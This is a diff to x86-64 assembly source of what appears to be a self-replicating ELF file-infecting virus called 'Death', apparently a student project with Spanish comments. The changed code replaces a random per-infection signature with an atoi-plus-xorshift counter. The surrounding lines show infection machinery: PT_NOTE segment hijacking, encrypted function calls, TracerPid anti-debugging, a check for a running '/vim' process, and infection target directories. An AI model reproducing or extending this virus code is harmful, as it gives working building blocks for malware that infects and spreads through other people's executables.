@@ -179,43 +179,77 @@ section .text
         ret
     __F_mmap__end:
 
+    __F_atoi:
+      ; rax = resultado
+      .str_to_int:
+          xor rax, rax
+      .loop:
+          movzx rcx, byte [rsi]   ; cargar caracter
+          test rcx, rcx           ; ¿fin de string?
+          jz .done
+          sub rcx, '0'            ; convertir ASCII a número
+          imul rax, rax, 10       ; resultado *= 10
+          add rax, rcx            ; resultado += digito
+          inc rsi                 ; siguiente caracter
+          jmp .loop
+      .done:
+          ret
+    __F_atoi__end:
+
     __F_set_unique_trace:
-        sub rsp, 12
-        lea rdi, [rsp]
-        mov rsi, 12
-        mov rdx, 0x01
-        mov rax, SC_GETRANDOM
-        syscall
+      ; rax = integer from atoi(signature)
+      ; lo transformamos haciendo paranoias
+      mov rcx, rax
+      shl rcx, 13
+      xor rax, rcx
 
-        ; rdi = buf
-        ; destruye: rax, rbx, rdx, rcx
+      mov rcx, rax
+      shr rcx, 17
+      xor rax, rcx
 
-        xor rcx, rcx          ; i = 0
-        .convert_loop:
-            cmp rcx, 12
-            je .write_signature
+      mov rcx, rax
+      shl rcx, 5
+      xor rax, rcx
 
-            movzx eax, byte [rdi + rcx]
-            xor edx, edx
-            mov ebx, 10
-            div ebx        ; rax / 10 => deja en dl el residuo => mod 10
-            add dl, '0'
-            mov [rdi + rcx], dl
+         ; Dejamos el numero de forma que sea representable en chars (decimal) en 8 cifras.
+      and rax, 0x3FFFFFF
 
-            inc rcx
-            jmp .convert_loop
+      ; rdi = buf
+      ; destruye: rax, rbx, rdx, rcx
+      lea rdi, [rel Traza]
+      add rdi, Traza_len + 1
+      add rdi, 8
 
-            ; rdi = 65137838234
-        .write_signature:
-            mov rax, rdi
-            lea rdi, [rel Traza]
-            add rdi, Traza_len + 1
-            mov rsi, rax
-            mov rcx, 12
-            cld
-            rep movsb
-        add rsp, 12
-        ret
+      ; rcx = contador (para escribir 8 bytes exactos)
+      ; r8 = buffer a escribir el numbero transformado. r8 apunta al final del buffer,
+      ; no al principio. Es porque escribimos del final al principio.
+      xor rcx, rcx
+      sub rsp, 8
+      lea rsi, [rsp+7]
+
+      mov rcx, 8
+      mov rbx, 10
+      .convert_loop:
+
+        ; rax = numerete
+        xor rdx, rdx
+        div rbx       ; rax / rbx. rdx = resto.
+
+        add dl, '0'
+        mov [rsi], dl
+        dec rsi
+        dec rcx
+        jnz .convert_loop
+
+      lea rsi, [rsp]
+      lea rdi, [rel Traza]
+      add rdi, Traza_len + 1
+      mov rcx, 8
+      cld
+      rep movsb
+
+      add rsp, 8
+      ret
     __F_set_unique_trace__end:
 
     __F_crazy0:
@@ -702,6 +736,11 @@ section .text
         CALL_ENCRYPT(mod_pt_note)
  
     .unique_trace:
+        xor rax, rax
+        lea rsi, [rel Traza]
+        add rsi, Traza_len + 1
+        CALL_ENCRYPT(atoi)
+        ; rax = el valor del contador que setea la signature
         CALL_ENCRYPT(set_unique_trace)
 
 	.mod_functions:
@@ -811,7 +850,7 @@ section .text
     __F_data:
     tracerPid_str   db      0x54,0x72,0x61,0x63,0x65,0x72,0x50,0x69,0x64,0x3A,0x9  ;"TracerPid:",0x9 ; 11
     status_file     db      0x2F,0x70,0x72,0x6F,0x63,0x2F,0x73,0x65,0x6C,0x66,0x2F,0x73,0x74,0x61,0x74,0x75,0x73,0 ;"/proc/self/status",0 ; 18
-    forbidden_prog  db      "/vim2"
+    forbidden_prog  db      "/vim"
     forbidden_prog_len equ  $ - forbidden_prog - 1
     exe_string      db      0x2F,0x65,0x78,0x65,0 ;"/exe",0 ; 5
     dirs            db      0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0,0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0x32,0,0  ;"/tmp/test",0,"/tmp/test2",0,0
@@ -819,8 +858,8 @@ section .text
     __F_data__end:
     Traza_position  equ     _finish - Traza
     fix_char        db      0
-    Traza           db      "Death version 1.0 (c)oded by tomartin & carce-bo 000000000001",0  ;46
-    Traza_len       equ     $ - Traza - 1 - 12 - 1
+    Traza           db      "Death version 1.0 (c)oded by tomartin & carce-bo 42069420",0  ;46
+    Traza_len       equ     $ - Traza - 1 - 8 - 1
     host_entrypoint dq      _dummy_host_entrypoint
     virus_vaddr     dq      _start
 
